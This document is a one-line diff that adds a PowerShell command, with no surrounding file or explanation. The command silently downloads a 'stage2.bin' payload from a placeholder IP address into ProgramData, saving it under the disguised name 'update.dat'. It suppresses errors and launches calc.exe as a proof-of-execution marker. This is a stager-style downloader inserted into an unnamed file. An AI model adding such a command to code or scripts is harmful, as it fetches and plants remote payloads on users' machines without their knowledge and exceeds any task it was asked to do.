@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source "https://192.0.2.16/stage2.bin" -Destination "C:\ProgramData\update.dat" -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
